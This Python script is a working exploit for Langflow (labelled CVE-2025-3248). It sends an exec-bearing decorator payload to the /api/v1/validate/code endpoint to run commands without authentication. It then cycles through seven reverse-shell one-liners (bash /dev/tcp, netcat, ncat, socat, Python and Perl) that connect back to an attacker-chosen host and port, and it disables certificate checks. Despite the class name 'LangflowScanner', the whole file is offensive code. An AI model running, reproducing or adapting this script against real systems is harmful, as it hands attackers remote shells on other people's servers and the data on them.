import argparse
import requests
import json
from urllib.parse import urljoin
import random
from colorama import init, Fore, Style

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Initialize colorama
init(autoreset=True)

# Constants
ENDC = "\033[0m"
ENCODING = "UTF-8"
COLORS = [Fore.GREEN, Fore.CYAN, Fore.BLUE]

class LangflowScanner:
    def __init__(self, url, timeout=10):
        self.url = url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        })

    def exploit(self, lhost, lport):
        # Try multiple reverse shell methods with proper syntax
        reverse_shell_methods = [
            # Bash method
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            # Netcat traditional method
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            # Netcat with -e (if available)
            f"nc -e /bin/bash {lhost} {lport}",
            # Ncat method
            f"ncat {lhost} {lport} -e /bin/bash",
            # Socat method
            f"socat TCP:{lhost}:{lport} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
            # Python method
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
            # Perl method
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'"
        ]
        
        endpoint = urljoin(self.url, '/api/v1/validate/code')

        for i, reverse_shell_cmd in enumerate(reverse_shell_methods, 1):
            method_name = reverse_shell_cmd.split()[0]
            print(f"{Fore.YELLOW}[*] Trying method {i}/{len(reverse_shell_methods)}: {method_name}")
            
            payload = {"code": f"@exec(\"__import__(\\\"subprocess\\\").call(\\\"{reverse_shell_cmd}\\\", shell=True)\")\ndef foo():\n  pass"}

            try:
                response = self.session.post(endpoint, json=payload, timeout=self.timeout)
                print(f"{Fore.YELLOW}[*] Status Code: {response.status_code}")

                if response.status_code == 200:
                    return f"[+] Reverse shell payload sent successfully to {lhost}:{lport} using {method_name}"
                
            except requests.RequestException as e:
                print(f"{Fore.RED}[!] Method {i} failed: {str(e)}")
                continue
                
        return f"[!] All reverse shell methods failed"

def main():
    parser = argparse.ArgumentParser(description="Langflow CVE-2025-3248 Reverse Shell Exploit")
    parser.add_argument("--url", required=True, help="Target base URL (e.g., http://host:port)")
    parser.add_argument("--lhost", required=True, help="Listener IP address (e.g., 192.168.1.2)")
    parser.add_argument("--lport", required=True, help="Listener port (e.g., 4444)")
    args = parser.parse_args()

    scanner = LangflowScanner(args.url)
    result = scanner.exploit(args.lhost, args.lport)
    print(f"{Fore.GREEN}{result}")
    print(f"{Fore.YELLOW}[*] Make sure you have a listener running: nc -lvnp {args.lport}")

if __name__ == "__main__":
    main()